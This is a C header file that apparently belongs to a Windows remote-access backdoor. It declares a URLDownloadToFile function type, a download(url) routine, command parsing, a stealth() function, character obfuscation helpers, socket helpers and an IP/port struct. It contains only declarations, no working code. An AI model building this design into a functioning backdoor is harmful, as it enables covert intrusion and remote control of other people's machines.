/*      _ _       _
 * _ __| | | _ __/ |
 * | '_ \_  _| '_\  |
 * | .__/ |_|| .__/_|
 * |_|       |_|
 *
 * Header file.
 *
 ******/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define str(a) #a
#define xstr(a) str(a)
#define BUFSIZE 9999

typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);

char wrecvsid(int sock, int size, int *br);
char incr(char ch);
char decr(char ch);
int iscommand(char buf);
int download(char * url);
int sendui(int s, char uin, int * bs);
void stealth();

typedef struct {

	int portno;
	char ip[16];

} fileWrapper;
